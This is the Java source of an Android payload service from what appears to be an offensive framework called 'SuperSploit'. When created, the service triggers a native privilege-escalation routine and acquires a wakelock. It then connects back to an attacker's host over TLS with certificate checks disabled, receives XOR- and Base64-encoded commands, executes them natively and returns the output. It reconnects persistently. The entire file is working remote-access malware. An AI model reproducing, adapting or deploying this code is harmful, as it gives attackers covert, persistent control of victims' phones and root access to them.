package org.supersploit.stub;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Base64;

import java.io.InputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class PayloadService extends Service {

    static {
        System.loadLibrary("payload");
    }

    public native String executeNative(String cmd);
    public native void startLPE();

    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        
        // Trigger Native LPE
        try {
            startLPE();
        } catch (Exception e) {
            android.util.Log.e("SuperSploit", "Failed to start Native LPE", e);
        }
        
        // Grab configuration from resources
        final String lhost = getString(getResources().getIdentifier("lhost", "string", getPackageName()));
        final int lport = Integer.parseInt(getString(getResources().getIdentifier("lport", "string", getPackageName())));
        final String xorKey = getString(getResources().getIdentifier("xor_key", "string", getPackageName()));
        final String wakeStr = getString(getResources().getIdentifier("wakelock", "string", getPackageName()));

        if ("true".equalsIgnoreCase(wakeStr)) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SuperSploit::PayloadWakelock");
                wakeLock.acquire();
            }
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                connectionLoop(lhost, lport, xorKey);
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    private void connectionLoop(String lhost, int lport, String xorKey) {
        while (true) {
            try {
                TrustManager[] trustAllCerts = new TrustManager[]{
                        new X509TrustManager() {
                            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                            public void checkClientTrusted(X509Certificate[] certs, String authType) {}
                            public void checkServerTrusted(X509Certificate[] certs, String authType) {}
                        }
                };

                SSLContext sc = SSLContext.getInstance("TLS");
                sc.init(null, trustAllCerts, new SecureRandom());
                SSLSocketFactory factory = sc.getSocketFactory();

                SSLSocket socket = (SSLSocket) factory.createSocket(lhost, lport);
                socket.startHandshake();

                InputStream in = socket.getInputStream();
                OutputStream out = socket.getOutputStream();

                // Send banner
                String banner = "Android Native Session: " + android.os.Build.MODEL + "\n";
                sendData(out, banner, xorKey);

                while (true) {
                    byte[] lenBuf = new byte[4];
                    int read = 0;
                    while (read < 4) {
                        int r = in.read(lenBuf, read, 4 - read);
                        if (r == -1) throw new Exception("EOF");
                        read += r;
                    }

                    int dataLen = ByteBuffer.wrap(lenBuf).order(ByteOrder.BIG_ENDIAN).getInt();
                    if (dataLen == 0) continue; // Heartbeat

                    byte[] dataBuf = new byte[dataLen];
                    read = 0;
                    while (read < dataLen) {
                        int r = in.read(dataBuf, read, dataLen - read);
                        if (r == -1) throw new Exception("EOF");
                        read += r;
                    }

                    String b64Cmd = new String(dataBuf, "UTF-8");
                    byte[] encCmd = Base64.decode(b64Cmd, Base64.DEFAULT);
                    byte[] decCmd = xor(encCmd, xorKey.getBytes("UTF-8"));
                    String cmd = new String(decCmd, "UTF-8").trim();

                    if (cmd.equalsIgnoreCase("exit")) {
                        socket.close();
                        return;
                    }

                    // Execute native payload
                    String output = executeNative(cmd);
                    if (output == null || output.isEmpty()) {
                        output = " \n";
                    }

                    sendData(out, output, xorKey);
                }
            } catch (Exception e) {
                android.util.Log.e("SuperSploit", "Connection failed: " + e.getMessage(), e);
                try { Thread.sleep(10000); } catch (Exception ignored) {}
            }
        }
    }

    private void sendData(OutputStream out, String data, String xorKey) throws Exception {
        byte[] enc = xor(data.getBytes("UTF-8"), xorKey.getBytes("UTF-8"));
        String b64 = Base64.encodeToString(enc, Base64.NO_WRAP);
        byte[] payload = b64.getBytes("UTF-8");

        byte[] lenBuf = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt(payload.length).array();
        out.write(lenBuf);
        out.write(payload);
        out.flush();
    }

    private byte[] xor(byte[] data, byte[] key) {
        byte[] out = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            out[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return out;
    }
}
